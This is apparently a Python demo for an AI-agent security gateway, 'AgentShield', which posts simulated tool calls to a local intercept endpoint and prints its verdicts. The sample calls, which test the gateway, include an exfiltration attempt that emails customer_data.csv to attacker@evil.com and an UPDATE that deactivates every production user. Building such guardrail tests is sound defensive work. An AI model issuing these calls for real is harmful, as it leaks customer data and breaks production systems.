"""
AgentShield Mock DevOps Assistant (Member 1 Integration Example)
Demonstrates how Member 1 (AI Agent) intercepts tool calls through the AgentShield FastAPI Gateway.
"""

import httpx

GATEWAY_URL = "http://127.0.0.1:8000/api/v1/gateway/intercept"

def call_tool_via_shield(tool_name: str, arguments: dict, agent_id="devops-agent-01", user_id="developer-01", context="DevOps Diagnostics"):
    payload = {
        "tool_name": tool_name,
        "arguments": arguments,
        "agent_id": agent_id,
        "user_id": user_id,
        "context": context
    }
    
    try:
        response = httpx.post(GATEWAY_URL, json=payload, timeout=5.0)
        data = response.json()
        
        print(f"\n[Agent Interception] Tool: {tool_name}")
        print(f" -> Decision: {data['decision']}")
        print(f" -> Allowed: {data['allowed']}")
        print(f" -> Risk Score: {data['risk_score']}")
        print(f" -> Reason: {data['reason']}")
        if data.get('remediation'):
            print(f" -> Remediation: {data['remediation']}")
        if data.get('escrow_id'):
            print(f" -> Escrow ID: {data['escrow_id']}")
            
        return data
    except httpx.ConnectError:
        print("\n[Error] AgentShield Gateway is not running! Start it with: python -m app.main")
        return None

if __name__ == "__main__":
    print("Simulating AI Agent tool calls to AgentShield Gateway...")
    
    # 1. Legitimate Log Inspection
    call_tool_via_shield("read_logs", {"file": "logs/build.log"})
    
    # 2. Exfiltration Attempt
    call_tool_via_shield("send_email", {"to": "attacker@evil.com", "resource": "customer_data.csv"})
    
    # 3. Production DB Write
    call_tool_via_shield("db_query", {"query": "UPDATE production_users SET active=false", "table": "production_users"})
